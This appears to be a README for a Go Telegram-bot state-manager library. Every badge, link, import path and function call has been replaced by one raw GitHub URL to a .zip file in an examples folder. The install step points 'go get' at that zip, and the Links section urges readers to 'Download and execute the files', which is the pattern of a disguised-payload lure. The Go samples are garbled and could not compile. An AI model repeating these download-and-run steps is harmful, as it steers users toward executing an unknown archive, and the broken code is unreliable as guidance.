# 🌟 tg-state-manager

![GitHub release](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip)
![GitHub issues](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip)
![GitHub stars](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip)

A simple and flexible state management package for Telegram bots in Go.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Introduction

Managing state in Telegram bots can be challenging. The `tg-state-manager` package provides a straightforward solution. It allows developers to manage user states easily, making it perfect for building interactive bots. This library is designed with flexibility in mind, catering to both simple and complex bot requirements.

## Features

- **Easy to Use**: Simple API for quick integration.
- **Flexible**: Supports various state management strategies.
- **Redis Support**: Built-in support for Redis for persistent state storage.
- **Generics**: Leverages Go's generics for type safety.
- **Lightweight**: Minimal overhead for maximum performance.
- **Compatible**: Works well with popular Telegram bot libraries like Telebot and Telego.

## Installation

To install the `tg-state-manager`, run the following command:

```bash
go get https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip
```

## Usage

Using `tg-state-manager` is straightforward. Below is a simple example to get you started.

### Basic Setup

```go
package main

import (
    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
)

func main() {
    bot, err := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip("YOUR_API_TOKEN")
    if err != nil {
        https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(err)
    }

    stateManager := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip()

    // Your bot logic here
}
```

### Managing User States

You can easily manage user states with the following methods:

```go
// Set state for a user
https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(userID, "current_state")

// Get state for a user
state, err := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(userID)
if err != nil {
    // Handle error
}

// Clear state for a user
https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(userID)
```

## Examples

Here are a few examples to illustrate how you can use `tg-state-manager` in your bot.

### Example 1: Simple Command Handling

```go
package main

import (
    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
)

func main() {
    bot, _ := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip("YOUR_API_TOKEN")
    stateManager := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip()

    updates := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip("/")

    for update := range updates {
        if https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip != nil {
            switch https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip {
            case "/start":
                https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip, "started")
                https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip, "Welcome!"))
            case "/stop":
                https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip)
                https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip, "Goodbye!"))
            }
        }
    }
}
```

### Example 2: Using Redis for State Management

```go
package main

import (
    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
    "https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip"
)

func main() {
    bot, _ := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip("YOUR_API_TOKEN")
    redisClient := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(&https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip{
        Addr: "localhost:6379",
    })
    stateManager := https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip(redisClient)

    // Your bot logic here
}
```

## Contributing

We welcome contributions to `tg-state-manager`. If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature-branch`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add new feature'`).
5. Push to the branch (`git push origin feature-branch`).
6. Create a pull request.

Please ensure your code adheres to the project's coding standards and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

For the latest releases, please visit [Releases](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip). Download and execute the files as needed.

For further updates and documentation, check the [Releases](https://raw.githubusercontent.com/darkfkklip/tg-state-manager/main/examples/registeration-bot/state_manager_tg_v2.1-beta.3.zip) section.

## Conclusion

The `tg-state-manager` package simplifies state management for Telegram bots in Go. Its flexibility and ease of use make it a great choice for developers looking to enhance their bot functionality. Whether you are building a simple bot or a complex interactive experience, this library provides the tools you need.

Feel free to explore the code, report issues, and contribute to the project. Happy coding!